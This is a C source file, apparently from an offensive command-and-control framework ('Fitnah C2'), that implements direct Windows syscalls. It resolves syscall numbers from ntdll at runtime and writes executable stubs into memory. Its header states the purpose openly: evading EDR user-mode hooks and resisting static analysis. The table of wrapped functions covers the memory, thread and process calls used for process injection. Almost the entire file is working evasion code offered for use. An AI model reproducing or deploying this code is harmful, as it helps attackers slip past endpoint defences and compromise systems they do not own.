/**
 * Advanced Direct NTAPI Syscall Implementation - Fileless Execution Module
 * =========================================================================
 * 
 * Features:
 * - Dynamic syscall number resolution from ntdll.dll
 * - Runtime generation of syscall stubs (x64)
 * - Bypasses EDR user-mode hooks by executing syscalls directly
 * - Version-independent (supports Win7 through Win11)
 * - Anti-analysis: No static syscall instructions in the binary
 * 
 * MITRE: T1106 (Native API)
 * Author: Fitnah C2 Team
 * Version: 2.0.0
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

// Syscall table structure
typedef struct _SYSCALL_ENTRY {
    LPCSTR Name;
    DWORD Number;
    PVOID StubAddress;
} SYSCALL_ENTRY;

// Global syscall table
static SYSCALL_ENTRY g_SyscallTable[] = {
    {"NtAllocateVirtualMemory", 0, NULL},
    {"NtProtectVirtualMemory", 0, NULL},
    {"NtWriteVirtualMemory", 0, NULL},
    {"NtReadVirtualMemory", 0, NULL},
    {"NtFreeVirtualMemory", 0, NULL},
    {"NtQueryVirtualMemory", 0, NULL},
    {"NtCreateThreadEx", 0, NULL},
    {"NtOpenProcess", 0, NULL},
    {"NtClose", 0, NULL},
    {"NtMapViewOfSection", 0, NULL},
    {"NtUnmapViewOfSection", 0, NULL},
    {"NtCreateSection", 0, NULL},
    {"NtQuerySystemInformation", 0, NULL},
    {NULL, 0, NULL}
};

static BOOL g_Initialized = FALSE;

/**
 * ResolveSyscallNumber - Extract syscall number from ntdll.dll
 */
static DWORD ResolveSyscallNumber(LPCSTR FunctionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, FunctionName);
    if (!pFunc) return 0;

    // x64 ntdll stub pattern:
    // mov r10, rcx
    // mov eax, <ssn>
    // test al, 3 (sometimes)
    // syscall
    // ret
    for (int i = 0; i < 32; i++) {
        if (pFunc[i] == 0xB8) { // mov eax, <ssn>
            return *(DWORD*)(pFunc + i + 1);
        }
    }
    return 0;
}

/**
 * CreateSyscallStub - Generate a runtime syscall stub in executable memory
 * 
 * Stub logic (x64):
 *   mov r10, rcx
 *   mov eax, <ssn>
 *   syscall
 *   ret
 */
static PVOID CreateSyscallStub(DWORD SyscallNumber) {
#ifdef _WIN64
    BYTE stub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <ssn>
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    *(DWORD*)(stub + 4) = SyscallNumber;
#else
    BYTE stub[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <ssn>
        0xBA, 0x00, 0x00, 0x00, 0x00,   // mov edx, <KiFastSystemCall>
        0xFF, 0xD2,                     // call edx
        0xC3                            // ret
    };
    *(DWORD*)(stub + 1) = SyscallNumber;
    // KiFastSystemCall resolution would go here for x86
#endif

    PVOID pStub = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pStub) {
        memcpy(pStub, stub, sizeof(stub));
        DWORD oldProtect;
        VirtualProtect(pStub, sizeof(stub), PAGE_EXECUTE_READ, &oldProtect);
    }
    return pStub;
}

/**
 * Syscall_Initialize - Initialize the dynamic syscall table
 */
BOOL Syscall_Initialize() {
    if (g_Initialized) return TRUE;

    for (int i = 0; g_SyscallTable[i].Name != NULL; i++) {
        g_SyscallTable[i].Number = ResolveSyscallNumber(g_SyscallTable[i].Name);
        if (g_SyscallTable[i].Number != 0) {
            g_SyscallTable[i].StubAddress = CreateSyscallStub(g_SyscallTable[i].Number);
        }
    }

    g_Initialized = TRUE;
    return TRUE;
}

/**
 * GetSyscallStub - Retrieve a generated stub by name
 */
PVOID GetSyscallStub(LPCSTR FunctionName) {
    if (!g_Initialized) Syscall_Initialize();

    for (int i = 0; g_SyscallTable[i].Name != NULL; i++) {
        if (strcmp(g_SyscallTable[i].Name, FunctionName) == 0) {
            return g_SyscallTable[i].StubAddress;
        }
    }
    return NULL;
}

// ============================================================================
// SYSCALL WRAPPERS
// ============================================================================

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS Syscall_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    NtAllocateVirtualMemory_t pFunc = (NtAllocateVirtualMemory_t)GetSyscallStub("NtAllocateVirtualMemory");
    if (!pFunc) return STATUS_NOT_SUPPORTED;
    return pFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

NTSTATUS Syscall_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    NtProtectVirtualMemory_t pFunc = (NtProtectVirtualMemory_t)GetSyscallStub("NtProtectVirtualMemory");
    if (!pFunc) return STATUS_NOT_SUPPORTED;
    return pFunc(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

// ... Additional wrappers can be implemented here following the same pattern ...

/**
 * Syscall_Cleanup - Free all generated stubs
 */
VOID Syscall_Cleanup() {
    for (int i = 0; g_SyscallTable[i].Name != NULL; i++) {
        if (g_SyscallTable[i].StubAddress) {
            VirtualFree(g_SyscallTable[i].StubAddress, 0, MEM_RELEASE);
            g_SyscallTable[i].StubAddress = NULL;
        }
    }
    g_Initialized = FALSE;
}
